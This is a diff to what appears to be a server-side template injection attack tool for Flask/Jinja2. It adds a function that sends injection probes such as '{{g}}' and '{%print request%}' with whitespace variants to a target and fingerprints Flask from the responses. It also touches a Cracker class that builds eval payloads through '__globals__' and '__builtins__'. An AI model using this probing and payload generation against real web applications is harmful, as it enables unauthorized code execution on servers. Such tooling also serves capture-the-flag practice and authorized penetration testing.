@@ -86,6 +86,40 @@ def guess_python_version(
     return version, subversion
 
 
+def guess_is_flask(submitter: Submitter):
+    payloads = [
+        (pattern.replace("VAR", var), text)
+        for var, text in [
+            ("g", "flask.g"),
+            ("request", "Request "),
+            ("self", "TemplateReference "),
+            ("session", "Session "),
+        ]
+        for pattern in [
+            "{{VAR}}",
+            "{%print VAR%}",
+            "{%print(VAR)%}",
+            "{%print\nVAR%}",
+            "{%print\tVAR%}",
+            "{%print\rVAR%}",
+        ]
+    ]
+    with pbar_manager.pbar(payloads, "guess_template_environment") as payloads:
+        for payload, text in payloads:
+            result = submitter.submit(payload)
+            if result is None or text not in result.text:
+                continue
+            logger.info(
+                "It might be [cyan bold]flask[/] because "
+                "we see [blue]%s[/] in [yellow]%s[/]",
+                rich_escape(repr(text)),
+                rich_escape(repr(payload)),
+                extra={"markup": True, "highlighter": None},
+            )
+            return True
+    return False
+
+
 class EvalArgsModePayloadGen:
     """在EvalArgs模式下的payload生成器"""
 
@@ -440,12 +474,14 @@ class Cracker:
         full_payload_gen.do_prepare()
         assert full_payload_gen.payload_gen is not None
         self.add_request_args(
-            full_payload_gen, waf_func, extra_values=[
+            full_payload_gen,
+            waf_func,
+            extra_values=[
                 "__globals__",
                 "__builtins__",
                 "values",
                 "eval",
-            ]
+            ],
         )
         full_payload_gen.payload_gen.cache_by_repr.clear()
         payload, will_print = full_payload_gen.generate(
